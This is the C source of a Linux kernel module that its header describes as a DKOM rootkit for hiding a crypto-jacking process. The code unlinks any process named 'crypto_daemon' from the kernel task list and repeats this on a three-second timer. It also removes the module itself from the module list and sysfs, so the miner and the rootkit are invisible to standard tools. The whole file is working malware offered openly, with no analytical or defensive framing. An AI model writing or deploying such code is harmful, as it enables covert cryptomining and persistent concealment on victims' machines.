#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched/signal.h>
#include <linux/version.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yousuf Shah");
MODULE_DESCRIPTION("DKOM rootkit to hide crypto-jacking process and kernel module");

// Our crypto-jacking process name
static const char *target_name = "crypto_daemon";

static int hidden = 0;
static struct list_head *prev_module;
static int last_hidden_pid = -1;

// Check if a task matches
static int should_hide_task(struct task_struct *task) {
    return strcmp(task->comm, target_name) == 0;
}

// Hide matching processes
static void hide_matching_processes(void) {
    struct task_struct *task;

    for_each_process(task) {
        if (should_hide_task(task)) {
            if (task->pid == last_hidden_pid) continue;
            printk(KERN_INFO "Rootkit: Hiding process: %s (pid %d)\n", task->comm, task->pid);
            list_del_init(&task->tasks);
            last_hidden_pid = task->pid;
        }
    }
}

// timer for dynamic hiding
#include <linux/timer.h>

static struct timer_list hide_timer;

static void hide_timer_callback(struct timer_list *t) {
    hide_matching_processes();
    mod_timer(&hide_timer, jiffies + msecs_to_jiffies(3000));  // runs every 3 seconds
}

// Hides this LKM
static void hide_module(void) {
    if (hidden)
        return;

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    hidden = 1;

    printk(KERN_INFO "Rootkit: Module hidden.\n");
}

// INIT / EXIT
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Loaded.\n");

    hide_matching_processes();  // Initial hide (if already running)
    hide_module();              // Hide the kernel module

    timer_setup(&hide_timer, hide_timer_callback, 0);
    mod_timer(&hide_timer, jiffies + msecs_to_jiffies(3000));  // start periodic process hiding

    return 0;
}

static void __exit rootkit_exit(void) {
    del_timer_sync(&hide_timer);
    printk(KERN_INFO "Rootkit: Unloaded.\n");

    // Cannot restore hidden tasks cleanly
    if (!hidden && prev_module)
        list_add(&THIS_MODULE->list, prev_module);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
